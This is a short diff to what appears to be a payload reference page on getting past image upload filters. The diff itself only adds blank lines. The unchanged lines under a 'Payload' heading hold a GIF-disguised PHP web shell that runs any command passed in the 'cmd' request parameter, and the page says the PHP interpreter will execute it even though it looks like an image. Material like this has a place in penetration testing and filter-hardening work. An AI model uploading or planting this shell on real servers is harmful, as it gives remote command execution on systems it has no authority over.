@@ -21,7 +21,11 @@ Web based image uploaders can filter certain image types, either associating the
 
 The PHP Interpreter can run this code, even though it looks like an image.
 
+
+
 ## Payload
+
+
 
 **Code** ([[ GIF8
 <?php echo system($_REQUEST["cmd"]); ?>]]):
@@ -30,3 +34,9 @@ The PHP Interpreter can run this code, even though it looks like an image.
  GIF8
 <?php echo system($_REQUEST["cmd"]); ?>
 ```
+
+
+
+
+
+
